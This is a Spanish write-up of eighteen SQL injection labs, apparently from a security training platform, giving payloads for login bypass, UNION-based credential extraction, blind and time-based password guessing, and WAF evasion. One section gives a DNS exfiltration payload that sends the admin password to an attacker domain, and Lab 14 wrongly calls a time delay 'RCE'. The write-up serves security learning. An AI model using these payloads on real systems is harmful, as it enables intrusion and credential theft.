LAB 01 Hidden Data Retrieval

Descripción Técnica: En este escenario, la aplicación web recibe el parámetro de categoría desde la URL y lo concatena directamente en una consulta SQL del tipo SELECT * FROM products WHERE category = '...' AND released = 1. La vulnerabilidad reside en la falta de validación de este parámetro, lo que permite manipular la lógica booleana de la sentencia WHERE para revelar artículos no publicados o inactivos.

Evidencia y Explicación: Interceptamos la petición HTTP utilizando Burp Suite y modificamos el parámetro category inyectando el payload ' OR 1=1--. Al hacer esto, la consulta en el backend se transforma en SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1. La secuencia -- comenta el resto de la línea original, haciendo que la cláusula OR 1=1 evalúe como verdadera para cada registro en la tabla, forzando a la base de datos a volcar el catálogo completo, independientemente del estado de liberación del producto.

LAB 02 Login Bypass

Descripción Técnica: La vulnerabilidad se presenta en el formulario de inicio de sesión, donde las credenciales proporcionadas por el usuario se insertan sin sanitizar en la consulta de autenticación. Esto permite truncar la validación lógica de la contraseña y autenticarse como cualquier usuario existente en el sistema, comprometiendo por completo el mecanismo de control de acceso.

Evidencia y Explicación: En el campo de nombre de usuario, ingresamos administrator'--. El sistema interpreta la consulta como SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'. La comilla simple cierra la cadena del nombre de usuario de manera prematura, mientras que los guiones anulan la verificación de la contraseña, retornando un resultado válido ("True") y concediendo acceso directo a la cuenta de administrador.

LAB 03 Determine Columns (UNION)

Descripción Técnica: Antes de poder extraer información útil de otras tablas mediante el operador UNION, es imperativo que nuestra consulta inyectada devuelva exactamente el mismo número de columnas que la consulta original. Este laboratorio se centra en la fase de descubrimiento (Fingerprinting estructural) de la consulta subyacente.

Evidencia y Explicación: Realizamos peticiones iterativas añadiendo valores nulos a la cláusula UNION: ' UNION SELECT NULL--, luego ' UNION SELECT NULL, NULL--, y finalmente ' UNION SELECT NULL, NULL, NULL--. Dado que la base de datos devuelve un Internal Server Error (500) cuando las columnas no coinciden, observamos que en el tercer intento la página se renderizó correctamente (200 OK), determinando con precisión que el backend requiere tres columnas.

LAB 04 Find Text Column (UNION)

Descripción Técnica: Una vez determinada la cantidad de columnas (3), el siguiente paso indispensable en un ataque UNION es identificar cuáles de estas columnas poseen tipos de datos compatibles con texto (VARCHAR/String). Las reglas estrictas de SQL dictan que el tipo de dato de cada columna inyectada debe coincidir con el de la consulta original.

Evidencia y Explicación: Procedimos a sustituir iterativamente cada valor NULL por el carácter alfanumérico 'a'. Al probar ' UNION SELECT NULL, 'a', NULL--, el frontend no generó errores de conversión de tipos y reflejó el string 'a' dentro de la tabla de listado de productos, confirmando que la segunda columna es el vector viable para exfiltrar datos en texto plano.

LAB 05 Retrieve Data from Other Tables

Descripción Técnica: Habiendo mapeado la estructura completa (cantidad de columnas y aquellas que soportan texto), ejecutamos la exfiltración real. El objetivo es apuntar al esquema users para extraer identificadores y hashes, fusionando los resultados de nuestra consulta maliciosa con la respuesta legítima de la aplicación web.

Evidencia y Explicación: Se construyó e inyectó el payload final: ' UNION SELECT username, password FROM users--. Dado que sabíamos que la consulta original devolvía dos columnas de texto compatibles en la respuesta visual, la base de datos acató la orden, iteró sobre la tabla 'users' y plasmó las credenciales administrativas de la base de datos directamente en el catálogo de artículos del frontend.

LAB 06 Multiple Values in Single Column

Descripción Técnica: En ocasiones, las defensas o la estructura de la aplicación limitan la visualización de resultados a una sola columna de texto, a pesar de que el operador UNION exige coincidir en múltiples columnas. La técnica para superar este bloqueo es la concatenación de cadenas, permitiendo extraer múltiples campos de la base de datos empaquetados en un solo string.

Evidencia y Explicación: Se determinó que la consulta requería dos columnas, pero solo una era visible. Usando el operador de concatenación estándar, inyectamos ' UNION SELECT username || '~' || password, NULL FROM users--. Esto instruyó al motor SQL a unir el nombre de usuario y la contraseña separados por una tilde, extrayendo ambos valores críticos y eludiendo la restricción visual.

LAB 07 Querying DB Version (Oracle)

Descripción Técnica: El reconocimiento de base de datos (Database Fingerprinting) es crucial para adaptar los comandos sintácticos en ataques complejos. Los motores de bases de datos tienen comportamientos únicos; por ejemplo, Oracle requiere estrictamente que cada sentencia SELECT provenga de una tabla (cláusula FROM), utilizando la tabla virtual dual o vistas dinámicas como v$version.

Evidencia y Explicación: Para extraer el banner de la versión y confirmar que nos enfrentábamos a un entorno Oracle, inyectamos ' UNION SELECT banner, NULL FROM v$version--. Al referenciar esta vista de rendimiento dinámica específica de Oracle, el sistema web nos devolvió en texto claro la versión exacta (ej. Oracle Database 11g Express Edition).

LAB 08 Querying DB Version (MySQL/Microsoft)

Descripción Técnica: A diferencia de Oracle, entornos como MySQL y Microsoft SQL Server permiten ejecutar consultas SELECT sin necesidad de invocar una tabla (omitiendo la cláusula FROM). Esto simplifica el Fingerprinting y nos permite consultar directamente las variables globales del servidor que contienen metadatos sensibles.

Evidencia y Explicación: Mediante el uso del payload ' UNION SELECT @@version, NULL# (donde el símbolo de hash # se utiliza comúnmente para comentar en MySQL), le pedimos al servidor que imprimiera el valor de la variable de sistema @@version. El frontend renderizó la cadena de versión, revelando la arquitectura y el parche actual del motor MySQL/MSSQL subyacente.

LAB 09 List DB Contents (Non-Oracle)

Descripción Técnica: La enumeración de esquemas (descubrimiento de tablas y columnas) es el proceso forense que precede a la exfiltración en aplicaciones de caja negra. En motores compatibles con el estándar ANSI SQL (como PostgreSQL, MySQL o MSSQL), este diccionario de datos estandarizado se aloja en la base de datos information_schema.

Evidencia y Explicación: Ejecutamos un escaneo del esquema en dos fases. Primero: ' UNION SELECT table_name, NULL FROM information_schema.tables--, lo que nos listó todas las tablas, identificando una llamada users_abcdef. Posteriormente, enumeramos sus columnas: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--, revelando los nombres ofuscados de los campos de contraseña, preparándonos para la extracción final.

LAB 10 List DB Contents (Oracle)

Descripción Técnica: En arquitecturas de Oracle, el estándar information_schema no está implementado. Por lo tanto, el descubrimiento de estructuras (esquemas, tablas y campos) requiere la consulta directa a las vistas de catálogo de diccionarios de datos privativas de Oracle, tales como all_tables y all_tab_columns.

Evidencia y Explicación: Sustituimos las consultas estandarizadas por comandos nativos de Oracle. Inyectamos ' UNION SELECT table_name, NULL FROM all_tables-- para obtener los nombres de tabla. Tras encontrar la tabla objetivo, mapeamos su estructura con ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XYZ'--, finalizando la exfiltración con el conocimiento preciso de los identificadores.

LAB 11 Blind SQLi (Conditional Responses)

Descripción Técnica: Las inyecciones SQL ciegas (Blind SQLi) ocurren cuando la vulnerabilidad existe en el backend, pero los resultados de las consultas no se reflejan en la respuesta HTTP. El método de "Respuestas Condicionales" explota diferencias sutiles en el comportamiento de la aplicación (como el mensaje de bienvenida) cuando se le somete a aserciones lógicas (Verdadero vs Falso).

Evidencia y Explicación: La cookie de tracking resultó vulnerable. Inyectamos una aserción booleana: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a. Observamos que si el carácter coincidía, la página respondía con "Welcome back". Se automatizó este proceso en Burp Suite Intruder (Ataque Sniper iterativo) para fuerza-brutear el hash carácter por carácter, resolviendo la contraseña completa sin verla directamente.

LAB 12 Blind SQLi (Conditional Errors)

Descripción Técnica: Cuando el frontend de la aplicación web no presenta variaciones de contenido frente a consultas booleanas (imposibilitando la técnica anterior), el ataque se eleva forzando un error de procesamiento a nivel de base de datos de manera condicional. Si la sentencia es correcta, obligamos a la base de datos a ejecutar una operación ilegal (como una división por cero), disparando un error 500 que el atacante utiliza como indicador positivo.

Evidencia y Explicación: En un entorno Oracle, elaboramos un payload usando estructuras CASE: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. Si la letra adivinada era incorrecta, la consulta no hacía nada y la página cargaba con código 200. Si la letra era correcta, el THEN 1/0 crasheaba la consulta devolviendo un Internal Server Error. Esto permitió iterar sobre el abecedario.

LAB 13 Visible Error-Based SQLi

Descripción Técnica: Las inyecciones basadas en errores visibles explotan las malas configuraciones en la gestión de errores del servidor. Si un servidor web está configurado en "Modo de Depuración", vomitará las trazas (Stack Traces) de la base de datos hacia el cliente. El atacante manipula los tipos de datos en la consulta forzando a la base a intentar una conversión imposible que exponga el valor del dato sensible dentro de la descripción del error.

Evidencia y Explicación: Sabiendo que la cookie evaluaba enteros, inyectamos la consulta ' AND CAST((SELECT password FROM users WHERE username='administrator') AS int)=1--. La subconsulta resolvió exitosamente la contraseña en texto, y posteriormente el motor SQL intentó convertirla en número (int). Al fallar catastróficamente, la página devolvió: "Error converting varchar value 'hash_secreto_123' to data type int", revelando el secreto.

LAB 14 Blind SQLi (Time Delays)

Descripción Técnica: Las inyecciones ciegas basadas en tiempo son el último recurso cuando la aplicación no devuelve diferencias visuales, ni responde a errores de sintaxis (Totalmente ciega y sincrónica). La técnica consiste en inyectar comandos de pausa o retardo en el motor de base de datos. Si la respuesta HTTP tarda el tiempo especificado en procesarse, se confirma la ejecución asíncrona del código malicioso.

Evidencia y Explicación: Analizando el comportamiento de una cookie de tracking en un motor PostgreSQL, inyectamos el comando de pausa nativo || pg_sleep(10)--. Monitoreando los milisegundos de respuesta en Burp Suite, corroboramos que la petición que normalmente tomaba 50ms se estancó exactamente durante 10,000ms antes de regresar el estado 200 OK. La vulnerabilidad de RCE temporal fue confirmada.

LAB 15 Blind SQLi (Time Delays & Info Retrieval)

Descripción Técnica: La culminación lógica de los ataques ciegos. Este laboratorio combina la extracción de información carácter por carácter (vista en el Lab 11) con las demoras temporales (Lab 14). Se genera una sentencia condicional donde la pausa de ejecución se acciona única y exclusivamente si la adivinación del carácter de la contraseña es verdadera, midiendo el *timeout* como prueba afirmativa.

Evidencia y Explicación: Automatizamos el ataque mediante el payload: %3BSELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--. Si la petición se resolvía inmediatamente, pasábamos a la letra 'b'. Si la petición se quedaba colgada durante 10 segundos, anotábamos la letra 'a' como el primer carácter de la contraseña, avanzando a la siguiente posición.

LAB 16 Blind SQLi (Out-of-Band Interaction)

Descripción Técnica: Ocasionalmente, las inyecciones ciegas basadas en tiempo o errores fallan debido a arquitecturas asíncronas profundas (donde la base de datos corre peticiones en *background threads* que no afectan la respuesta HTTP de la web). Para estas redes complejas, se emplean técnicas Out-of-Band (OAST). Consiste en forzar a la base de datos a iniciar una petición de red externa (usualmente una resolución DNS o un ping HTTP) hacia un servidor bajo control del atacante.

Evidencia y Explicación: A través de una inyección en Oracle, enviamos un payload estructurado en XML diseñado para generar un External Entity Injection (XXE) a nivel de base de datos: UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burpcollaborator.net/"> %remote;]>'),'/l') FROM dual. La máquina de la base de datos intentó resolver la entidad externa y el ping quedó registrado silenciosamente en los logs de nuestro panel de Burp Collaborator.

Descripción Técnica: Una vez validada la interacción de red Out-of-Band (Lab 16), el objetivo evoluciona de simplemente generar un "ping", a exfiltrar datos críticos de forma masiva y expedita en un entorno ciego. La técnica radica en concatenar la información extraída (como una subconsulta SQL que roba la contraseña) directamente dentro de la estructura de la URL del dominio atacante, transmitiendo los datos a través del protocolo DNS (Domain Name System).

Evidencia Documentada: Al carecer de la herramienta Burp Collaborator (inclusiva en licencias Pro), el procedimiento teórico dictamina el uso del payload: http://'||(SELECT password FROM users WHERE username='administrator')||'.subdominio-atacante.com. La base de datos evaluaría la consulta interior extrayendo el hash, y al intentar resolver el dominio completo (ej. hash12345.subdominio-atacante.com), el servidor DNS del atacante registraría el subdominio, logrando la fuga de información sin necesidad de comunicación directa con el frontend HTTP.

LAB 18 SQLi with Filter Bypass via XML Encoding

[ EVIDENCIA GRÁFICA OMITIDA: REQUIERE EXTENSIONES BURP SUITE PROFESSIONAL ]

Descripción Técnica: En infraestructuras corporativas y empresariales, los puntos de entrada son monitoreados rigurosamente por Web Application Firewalls (WAF). Estos dispositivos analizan las peticiones y bloquean palabras clave como `SELECT`, `UNION` o `DROP`. Para evadir estas defensas, los atacantes aplican técnicas de ofuscación de payloads (Encoding) adaptadas a la forma en que el backend procesa los datos (por ejemplo, decodificación de entidades XML antes de ser arrojadas al motor SQL).

Evidencia Documentada: El vector de ataque se enfocó en la funcionalidad de verificación de stock que transmite datos nativos en formato XML. Un payload tradicional 1 UNION SELECT username... sería abortado por el WAF en la capa perimetral. Utilizando la extensión Hackvertor (o manipuladores hexadecimales), el payload fue ofuscado empleando XML Hex Entities (ej. la letra S se convierte en &#x53;). El WAF inspecciona el string hexadecimal y lo deja pasar, asumiendo que es benigno. Al llegar al parser de backend, el código se decodifica de vuelta a la instrucción SQL maliciosa, eludiendo la defensa y concretando la inyección.
